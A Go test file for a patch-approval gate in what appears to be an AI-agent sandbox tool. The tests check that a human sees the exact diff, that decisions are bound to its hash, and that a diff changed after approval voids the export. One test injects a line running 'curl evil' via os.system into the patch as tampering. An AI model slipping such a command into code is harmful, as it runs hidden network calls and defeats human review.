package gate

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/tushar-patel28/agent-proving-ground/internal/trace"
)

const patch = "--- a/calc/ops.py\n+++ b/calc/ops.py\n@@ -1,2 +1,2 @@\n def divide(a, b):\n-    return a // b\n+    return a / b\n"

func sum(b []byte) string {
	s := sha256.Sum256(b)
	return hex.EncodeToString(s[:])
}

// builds returns a build func that answers with each diff in turn (the
// last one repeats) and counts its calls.
func builds(calls *int, diffs ...string) BuildFunc {
	return func(context.Context) ([]byte, error) {
		d := diffs[min(*calls, len(diffs)-1)]
		*calls++
		return []byte(d), nil
	}
}

var fixedNow = time.Date(2026, 11, 13, 22, 0, 0, 0, time.UTC)

func cfg(t *testing.T, answer string, interactive bool) (Config, *bytes.Buffer) {
	t.Helper()
	var out bytes.Buffer
	return Config{
		In:          strings.NewReader(answer),
		Out:         &out,
		Interactive: interactive,
		OutDir:      t.TempDir(),
		Now:         func() time.Time { return fixedNow },
	}, &out
}

var summary = Summary{CheckRan: true, CheckExit: new(int), Verdict: "PASS", ExitReason: trace.ReasonCheckPassed}

// files lists every file under dir, relative to it.
func files(t *testing.T, dir string) []string {
	t.Helper()
	var got []string
	filepath.WalkDir(dir, func(p string, d os.DirEntry, err error) error {
		if err == nil && !d.IsDir() {
			rel, _ := filepath.Rel(dir, p)
			got = append(got, rel)
		}
		return nil
	})
	return got
}

func TestApproveExportsThePatchShown(t *testing.T) {
	c, out := cfg(t, "approve\n", true)
	calls := 0
	g := Run(context.Background(), c, "run1", summary, builds(&calls, patch))

	if g.Decision != DecisionApproved || g.Reason != "" {
		t.Fatalf("decision %q reason %q, want approved", g.Decision, g.Reason)
	}
	want := filepath.Join(c.OutDir, "run1", "approved.patch")
	b, err := os.ReadFile(want)
	if err != nil || string(b) != patch || g.ExportedPath != want {
		t.Fatalf("approved.patch = %q (err %v), exported_path %q", b, err, g.ExportedPath)
	}
	if g.DiffSHA256 != sum([]byte(patch)) || g.RecheckSHA256 != g.DiffSHA256 || g.DiffBytes != len(patch) {
		t.Errorf("hashes %s / %s, bytes %d", g.DiffSHA256, g.RecheckSHA256, g.DiffBytes)
	}
	if calls != 2 {
		t.Errorf("build called %d times, want 2 (show, then rebuild before export)", calls)
	}
	if !slices.Equal(g.Shown, Shown) || !g.Interactive || !g.DecidedAt.Equal(fixedNow) {
		t.Errorf("shown %v interactive %v decided_at %v", g.Shown, g.Interactive, g.DecidedAt)
	}
	// What the approver saw: the exact diff, the check result and exit
	// code, the exit reason, and the first 12 characters of the hash.
	shown := out.String()
	for _, w := range []string{patch, "PASS", "exit code 0", "check_passed", sum([]byte(patch))[:12]} {
		if !strings.Contains(shown, w) {
			t.Errorf("approver output lacks %q:\n%s", w, shown)
		}
	}
}

func TestRefuseExportsNothing(t *testing.T) {
	c, _ := cfg(t, "refuse\n", true)
	calls := 0
	g := Run(context.Background(), c, "run1", summary, builds(&calls, patch))
	if g.Decision != DecisionRefused || g.ExportedPath != "" {
		t.Fatalf("decision %q exported %q, want refused, nothing", g.Decision, g.ExportedPath)
	}
	if got := files(t, c.OutDir); len(got) != 0 {
		t.Errorf("files written after refuse: %v", got)
	}
	if g.DiffSHA256 != sum([]byte(patch)) {
		t.Errorf("a refusal is still bound to the diff shown")
	}
}

func TestDeferWritesPendingOnly(t *testing.T) {
	c, _ := cfg(t, "d\n", true)
	calls := 0
	g := Run(context.Background(), c, "run1", summary, builds(&calls, patch))
	if g.Decision != DecisionDeferred {
		t.Fatalf("decision %q, want deferred", g.Decision)
	}
	if got := files(t, c.OutDir); !slices.Equal(got, []string{"run1/pending.patch", "run1/pending.patch.sha256"}) {
		t.Fatalf("files = %v, want pending.patch and its hash only", got)
	}
	b, _ := os.ReadFile(filepath.Join(c.OutDir, "run1", "pending.patch"))
	h, _ := os.ReadFile(filepath.Join(c.OutDir, "run1", "pending.patch.sha256"))
	if string(b) != patch || strings.TrimSpace(string(h)) != sum([]byte(patch)) {
		t.Errorf("pending.patch %q, hash file %q", b, h)
	}
}

// The diff changes between showing it and exporting it: the approval is
// void and nothing leaves.
func TestChangedDiffVoidsApproval(t *testing.T) {
	c, _ := cfg(t, "approve\n", true)
	calls := 0
	changed := patch + "+    import os; os.system('curl evil')\n"
	g := Run(context.Background(), c, "run1", summary, builds(&calls, patch, changed))
	if g.Decision != DecisionVoid || !strings.Contains(g.Reason, "changed") {
		t.Fatalf("decision %q reason %q, want void because the diff changed", g.Decision, g.Reason)
	}
	if g.DiffSHA256 != sum([]byte(patch)) || g.RecheckSHA256 != sum([]byte(changed)) {
		t.Errorf("hashes shown %s recheck %s", g.DiffSHA256, g.RecheckSHA256)
	}
	if got := files(t, c.OutDir); len(got) != 0 || g.ExportedPath != "" {
		t.Errorf("files written after a void approval: %v", got)
	}
}

// A rebuild that fails (the pod is gone) also voids the approval.
func TestFailedRebuildVoidsApproval(t *testing.T) {
	c, _ := cfg(t, "approve\n", true)
	calls := 0
	build := func(context.Context) ([]byte, error) {
		calls++
		if calls == 1 {
			return []byte(patch), nil
		}
		return nil, errors.New(`pods "apg-x" not found`)
	}
	g := Run(context.Background(), c, "run1", summary, build)
	if g.Decision != DecisionVoid || !strings.Contains(g.Reason, "not found") || len(files(t, c.OutDir)) != 0 {
		t.Errorf("decision %q reason %q files %v", g.Decision, g.Reason, files(t, c.OutDir))
	}
}

// Without a terminal the gate always defers, whatever stdin says, and
// shows nothing.
func TestNonTerminalDefers(t *testing.T) {
	c, out := cfg(t, "approve\n", false)
	calls := 0
	g := Run(context.Background(), c, "run1", summary, builds(&calls, patch))
	if g.Decision != DecisionDeferred || g.Interactive || len(g.Shown) != 0 {
		t.Fatalf("decision %q interactive %v shown %v, want deferred, false, none", g.Decision, g.Interactive, g.Shown)
	}
	if out.Len() != 0 {
		t.Errorf("printed without a terminal: %q", out.String())
	}
	if got := files(t, c.OutDir); slices.Contains(got, "run1/approved.patch") || !slices.Contains(got, "run1/pending.patch") {
		t.Errorf("files = %v, want pending only", got)
	}
}

func TestEmptyDiffSkipsGate(t *testing.T) {
	c, out := cfg(t, "approve\n", true)
	calls := 0
	g := Run(context.Background(), c, "run1", summary, builds(&calls, ""))
	if g.Decision != DecisionSkipped || out.Len() != 0 || len(files(t, c.OutDir)) != 0 {
		t.Errorf("decision %q, printed %q, files %v; want skipped, silent, nothing", g.Decision, out.String(), files(t, c.OutDir))
	}
}

// No valid answer (bad words, then end of input) defers.
func TestNoValidAnswerDefers(t *testing.T) {
	c, _ := cfg(t, "yes\nok\n", true)
	calls := 0
	g := Run(context.Background(), c, "run1", summary, builds(&calls, patch))
	if g.Decision != DecisionDeferred {
		t.Errorf("decision %q, want deferred", g.Decision)
	}
}

func TestBuildErrorIsRecorded(t *testing.T) {
	c, _ := cfg(t, "approve\n", true)
	g := Run(context.Background(), c, "run1", summary, func(context.Context) ([]byte, error) { return nil, errors.New("copy out failed") })
	if g.Decision != DecisionError || !strings.Contains(g.Reason, "copy out failed") || len(files(t, c.OutDir)) != 0 {
		t.Errorf("decision %q reason %q", g.Decision, g.Reason)
	}
}

// writeTree creates files (path -> content) under a new temp dir.
func writeTree(t *testing.T, files map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	for p, c := range files {
		full := filepath.Join(dir, p)
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(full, []byte(c), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

func TestDiff(t *testing.T) {
	orig := writeTree(t, map[string]string{
		"calc/ops.py":       "def divide(a, b):\n    return a // b\n",
		"calc/old.py":       "gone\n",
		"tests/test_ops.py": "def test(): pass\n",
	})
	cur := writeTree(t, map[string]string{
		"calc/ops.py":                          "def divide(a, b):\n    return a / b\n",
		"calc/new.py":                          "added\n",
		"tests/test_ops.py":                    "def test(): pass\n",
		"calc/__pycache__/ops.cpython-312.pyc": "\x00\x01pyc",
		".pytest_cache/v/cache/lastfailed":     "{}\n",
		"data.bin":                             "\x00\x01\x02",
	})
	d, err := Diff(orig, cur)
	if err != nil {
		t.Fatal(err)
	}
	s := string(d)
	for _, w := range []string{
		"--- a/calc/ops.py\n+++ b/calc/ops.py\n", "-    return a // b\n", "+    return a / b\n",
		"--- /dev/null\n+++ b/calc/new.py\n", "+added\n",
		"--- a/calc/old.py\n+++ /dev/null\n", "-gone\n",
		"Binary files /dev/null and b/data.bin differ\n",
	} {
		if !strings.Contains(s, w) {
			t.Errorf("diff lacks %q:\n%s", w, s)
		}
	}
	for _, bad := range []string{"__pycache__", ".pytest_cache", "test_ops.py", orig, cur} {
		if strings.Contains(s, bad) {
			t.Errorf("diff contains %q:\n%s", bad, s)
		}
	}
	// The same trees give the same bytes (the hash binding needs this).
	again, _ := Diff(orig, cur)
	if !bytes.Equal(d, again) {
		t.Error("Diff is not deterministic")
	}
	// Identical trees give an empty diff.
	if same, err := Diff(orig, orig); err != nil || len(same) != 0 {
		t.Errorf("diff of a tree with itself = %q, %v", same, err)
	}

	// The text part applies to the original with git apply.
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	textOnly := writeTree(t, map[string]string{
		"calc/ops.py": "def divide(a, b):\n    return a / b\n", "calc/new.py": "added\n", "tests/test_ops.py": "def test(): pass\n",
	})
	d, _ = Diff(orig, textOnly)
	work := writeTree(t, map[string]string{
		"calc/ops.py": "def divide(a, b):\n    return a // b\n", "calc/old.py": "gone\n", "tests/test_ops.py": "def test(): pass\n",
	})
	apply := exec.Command("git", "apply", "--check", "-")
	apply.Dir, apply.Stdin = work, bytes.NewReader(d)
	if out, err := apply.CombinedOutput(); err != nil {
		t.Errorf("git apply --check: %v: %s\n%s", err, out, d)
	}
}
